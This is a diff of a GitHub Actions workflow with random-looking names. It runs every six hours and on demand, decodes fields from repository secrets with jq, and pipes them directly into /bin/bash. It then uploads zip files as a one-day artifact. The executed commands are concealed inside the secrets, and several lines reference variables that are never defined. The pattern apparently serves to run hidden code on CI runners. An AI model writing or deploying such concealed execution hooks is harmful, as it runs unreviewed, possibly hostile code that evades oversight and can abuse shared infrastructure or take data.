@@ -1,24 +1,25 @@
 name: amandaprofile26
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '20 0/6 * * *'
 
+  schedule:
+    - cron: '4 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: amandaprofile26
         env:
-          e00296: ${{ secrets.e00296 }}
+          rwvbh3: ${{ secrets.rwvbh3 }}
         run: |
-          echo $e00296 | jq -r .imckh931 | /bin/bash
-          echo $tc6690 | jq -r .vtfj307 | /bin/bash
-          echo $kfi116 | jq -r .chu4731 | /bin/bash
-          echo $raqze08425 | jq -r .nnir30493 | /bin/bash
-          echo $dnev558 | jq -r .wtq829 | /bin/bash
-          echo $lw2496 | jq -r .fg809 | /bin/bash
+          printf '%s' "$rwvbh3" | jq -r .szskc7 | /bin/bash
+          printf '%s' "$agkj53993" | jq -r .wj583 | /bin/bash
+          echo $cav56 | jq -r .ma4 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Q5YqOaud
+          path: "*.zip"
+          retention-days: 1
